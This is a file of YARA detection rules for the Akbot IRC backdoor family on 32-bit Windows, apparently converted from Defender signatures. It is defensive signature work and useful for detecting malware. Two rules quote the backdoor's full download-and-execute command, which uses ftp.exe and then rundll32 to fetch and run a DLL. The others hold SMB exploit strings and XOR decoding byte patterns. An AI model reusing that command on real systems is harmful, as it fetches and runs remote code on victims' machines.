rule Backdoor_Win32_Akbot_A_2147595439_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Akbot.A"
        threat_id = "2147595439"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Akbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "nope.dll" ascii //weight: 1
        $x_1_2 = "cmd.exe /C echo open %s %hu>x&echo user x x>>x&echo bin>>x&echo get %s>>x&echo bye>>x&ftp.exe -n -s:x&del x&rundll32.exe %s,start" ascii //weight: 1
        $x_1_3 = "PC NETWORK PROGRAM 1.0" ascii //weight: 1
        $x_1_4 = "LANMAN1.0" ascii //weight: 1
        $x_1_5 = "Windows for Workgroups 3.1a" ascii //weight: 1
        $x_1_6 = "CACACACACACACACACACACACACACACA" ascii //weight: 1
        $x_1_7 = "v:* { behavior: url(#default#VML); }" ascii //weight: 1
        $x_1_8 = "method=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii //weight: 1
        $x_1_9 = "InternetOpenUrlA" ascii //weight: 1
        $x_1_10 = "FindNextFileA" ascii //weight: 1
        $x_1_11 = "CreateToolhelp32Snapshot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Akbot_B_2147595442_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Akbot.B"
        threat_id = "2147595442"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Akbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {6e 6f 70 65 2e 64 6c 6c 00 73 74 61 72 74 00}  //weight: 1, accuracy: High
        $x_1_2 = "PC NETWORK PROGRAM 1.0" ascii //weight: 1
        $x_1_3 = "LANMAN1.0" ascii //weight: 1
        $x_1_4 = "Windows for Workgroups 3.1a" ascii //weight: 1
        $x_1_5 = "CACACACACACACACACACACACACACACA" ascii //weight: 1
        $x_1_6 = "LANMAN2.1" ascii //weight: 1
        $x_1_7 = "NT LM 0.12" ascii //weight: 1
        $x_1_8 = "SMBs" ascii //weight: 1
        $x_1_9 = "InternetOpenUrlA" ascii //weight: 1
        $x_1_10 = "CreateToolhelp32Snapshot" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Akbot_2147608237_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Akbot"
        threat_id = "2147608237"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Akbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {2e 64 6c 6c 00 73 74 61 72 74 00}  //weight: 5, accuracy: High
        $x_5_2 = "cmd.exe /C echo open %s %hu>x&echo user x x>>x&echo bin>>x&echo get %s>>x&echo bye>>x&ftp.exe -n -s:x&del x&rundll32.exe %s,start" ascii //weight: 5
        $x_1_3 = "PC NETWORK PROGRAM 1.0" ascii //weight: 1
        $x_1_4 = "LANMAN1.0" ascii //weight: 1
        $x_1_5 = "LANMAN2.1" ascii //weight: 1
        $x_1_6 = "Windows for Workgroups 3.1a" ascii //weight: 1
        $x_1_7 = "CACACACACACACACACACACACACACACA" ascii //weight: 1
        $x_10_8 = {7c 02 eb 1e 8b 45 ?? 03 45 ?? 0f be 08 8b 55 ?? 03 55 f8 ?? be 02 33 c1 8b 4d ?? 03 4d ?? 88 01 eb}  //weight: 10, accuracy: Low
        $x_10_9 = {7c 02 eb 1a 8b 4d ?? 03 4d ?? 8b 55 ?? 03 55 ?? 8a 01 32 02 8b 4d ?? 03 4d ?? 88 01 eb}  //weight: 10, accuracy: Low
        $x_10_10 = {33 d2 85 c9 7e 10 3b 55 ?? 7d 0b 8a 04 1e 30 04 3a 42 3b d1 7c f0}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 5 of ($x_1_*))) or
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            ((1 of ($x_10_*) and 1 of ($x_5_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Win32_Akbot_K_2147616419_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Akbot.K"
        threat_id = "2147616419"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Akbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ConfigGUI - AkBot IRC" ascii //weight: 1
        $x_1_2 = "listSERVERS" ascii //weight: 1
        $x_1_3 = "Server Pass" ascii //weight: 1
        $x_1_4 = "Scan Channel" ascii //weight: 1
        $x_1_5 = "Channel Key" ascii //weight: 1
        $x_1_6 = "Input Bot ID" wide //weight: 1
        $x_1_7 = "char e_botid[" wide //weight: 1
        $x_1_8 = "const char e_port[" wide //weight: 1
        $x_1_9 = "const char e_serverpass[" wide //weight: 1
        $x_1_10 = "const char e_channel[" wide //weight: 1
        $x_1_11 = "const char e_filename[" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

